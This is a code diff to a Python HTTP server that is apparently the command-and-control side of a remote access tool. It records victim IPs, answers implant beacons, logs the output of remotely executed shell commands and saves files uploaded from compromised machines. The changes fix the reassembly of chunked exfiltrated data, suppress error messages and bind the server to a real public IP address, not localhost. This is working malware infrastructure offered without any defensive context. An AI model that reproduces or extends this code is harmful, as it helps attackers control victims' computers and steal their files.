@@ -156,15 +156,21 @@ class HTTPHandler(TypeTable, BaseHTTPRequestHandler):
 
         next_sequence_num = SEQUENCE_DATA[client_ip][0]
 
-        if seq == next_sequence_num:
+        if seq == 0 and next_sequence_num == 1:
+            return data
+
+        elif seq == next_sequence_num:
             SEQUENCE_DATA[client_ip][1] += data
             SEQUENCE_DATA[client_ip][0] += 1
-        elif seq != 0:
-            raise Exception("Invalid Sequence / {0}".format(seq))
+
+        # elif seq != 0:
+        #     raise Exception("Invalid Sequence / {0}".format(seq))
         elif seq == 0 and next_sequence_num != 1:
-            print('==splited data==\n{}\n'.format(SEQUENCE_DATA[client_ip][1]))
+            # print('==splited data==\n{}\n'.format(SEQUENCE_DATA[client_ip][1]))
+            result = SEQUENCE_DATA[client_ip][1] + data
             SEQUENCE_DATA[client_ip][1] = b""
             SEQUENCE_DATA[client_ip][0] = 1
+            return result
     
     def save_file(self, file_name, data):
         try:
@@ -202,7 +208,7 @@ class HTTPHandler(TypeTable, BaseHTTPRequestHandler):
             self._add_victim_ip(client_ip)
 
             # sequence 처리
-            self._check_sequence(parsed_data['sequence'], parsed_data['data'], client_ip)
+            parsed_data['data'] = self._check_sequence(parsed_data['sequence'], parsed_data['data'], client_ip)
             
         except Exception as e:
             # 오류 발생시 오류 문구를 리턴
@@ -228,14 +234,16 @@ class HTTPHandler(TypeTable, BaseHTTPRequestHandler):
                 self._becon_ack_response()
         elif parsed_data['type'] == 'SHELL_RESPONSE': # SHELL_RESPONSE
             self.print_log('[*] execute result\n{}'.format(parsed_data['data'].decode(ENCODING)))
+            # print('[*] execute result\n{}'.format(parsed_data['data'].decode(ENCODING)))
             self._becon_ack_response()
         elif parsed_data['type'] == 'FTP_RESPONSE':
-            if len(FILE_NAME_LIST[client_ip]) > 0:
+            if len(FILE_NAME_LIST[client_ip]) > 0 and parsed_data['sequence'] == 0:
                 file_name = FILE_NAME_LIST[client_ip].popleft()
                 self.save_file(file_name, parsed_data['data'])
                 self._becon_ack_response()
             else:
-                self.print_log('[!] file queue error\nThere is no data in file name queue', True)
+                # self.print_log('[!] file queue error\nThere is no data in file name queue', True)
+                self._becon_ack_response()
         else:
             self._becon_ack_response()
 
@@ -251,7 +259,7 @@ LOG_PRINT = False
 
 # 서버 주소와 포트
 # 자신의 ip, port로 설정
-SERVER_INFO = ('127.0.0.1', 80)
+SERVER_INFO = ('1.251.227.66', 80)
 
 # encoding
 ENCODING = 'cp949'
